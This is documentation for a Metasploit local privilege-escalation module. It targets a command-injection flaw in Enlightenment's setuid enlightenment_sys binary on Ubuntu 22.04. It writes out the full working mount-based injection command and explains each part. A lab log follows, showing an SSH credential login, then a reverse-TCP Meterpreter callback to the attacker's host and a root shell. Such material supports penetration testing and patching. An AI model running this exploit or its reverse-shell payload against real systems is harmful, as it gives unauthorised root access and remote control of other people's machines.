## Vulnerable Application

This module exploits a command injection within Enlightenment's
`enlightenment_sys` binary. This is done by calling the mount
command and feeding it paths which meet all of the system
requirements, but execute a specific path as well due to a
semi-colon being used.
This module was tested on Ubuntu 22.04.1 X64 Desktop with
enlightenment 0.25.3-1 (current at module write time)

### Install

At the time of writing, it was possible to `apt install enlightenment` to
get a vulnerable version.

### Main Command Explanation

The main exploit command will look similar to the following (using `/tmp/exploit` as the payload path example):

`/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net`

This can be broken down in to several parts:

1. `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys`
2. `/bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u)`
3. `"/dev/../tmp/;/tmp/exploit"`
4. `/tmp///net`

The first part calls the vulnerable executable which has `suid` set to root.

The second portion is a standard mount, command. `enlightenment_sys` has a fork in the code
for `mount`, which has the vulnerability in it.

The third portion starts with `/dev/` to prevent the binary from exiting.  It is wrapped in
double quotes, which are later removed by `enlightenment_sys` before running the command
resulting in the command injection.

Lastly `enlightenment_sys` checks that the last parameter is length 6, thus the extra `/`.
It then calls `stat64` on `/tmp///net` and we pass that check.

Now that all the checks have passed and the exploit code should go down the path to a `system`
call. Again, the quotes are removed around `"/dev/../tmp/;/tmp/exploit"` , allowing for the `;`
to be relevant and cause a command injection.

## Verification Steps

1. Install the application
2. Start msfconsole
3. Get a userland shell
4. Do: `use exploits/linux/local/ubuntu_enlightenment_mount_priv_esc`
5. Do: `set session #`
6. Set payload and options for payload as needed
7. Do: `run`
8. You should get a root shell.

## Options

### WritableDir

A directory which is writable to drop our payload in. Defaults to `/tmp`

## Scenarios

### Ubuntu 22.04.1 Desktop with Enlightenment 0.25.3-1

Step 1, get a userland shell

```
resource (enlightenment.rb)> use auxiliary/scanner/ssh/ssh_login
resource (enlightenment.rb)> set username ubuntu
username => ubuntu
resource (enlightenment.rb)> set password ubuntu
password => ubuntu
resource (enlightenment.rb)> set rhosts 192.168.2.31
rhosts => 192.168.2.31
resource (enlightenment.rb)> run
[*] 192.168.2.31:22 - Starting bruteforce
[+] 192.168.2.31:22 - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare) Linux ubuntu2204desktop 5.15.0-43-generic #46-Ubuntu SMP Tue Jul 12 10:30:17 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (192.168.2.199:35675 -> 192.168.2.31:22) at 2022-10-01 10:02:53 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Step 2, run exploit

```
resource (enlightenment.rb)> use exploits/linux/local/ubuntu_enlightenment_mount_priv_esc
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
resource (enlightenment.rb)> set session 1
session => 1
resource (enlightenment.rb)> set verbose true
verbose => true
msf6 exploit(linux/local/ubuntu_enlightenment_mount_priv_esc) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: 
[*] Started reverse TCP handler on 192.168.2.199:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Found binary: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
[+] It's set for SUID
[+] The target appears to be vulnerable.
[*] Finding enlightenment_sys
[+] Found binary: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
[+] It's set for SUID
[*] Writing '/tmp/.7n09J2bt6' (250 bytes) ...
[*] Max line length is 65537
[*] Writing 250 bytes in 1 chunks of 735 bytes (octal-encoded), using printf
[*] Creating folders for exploit
[+] Found binary: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
[+] It's set for SUID
[*] Launching exploit...
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045348 bytes) to 192.168.2.31
[*] Meterpreter session 2 opened (192.168.2.199:4444 -> 192.168.2.31:54700) at 2022-10-01 10:03:12 -0400

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.2.31
OS           : Ubuntu 22.04 (Linux 5.15.0-43-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
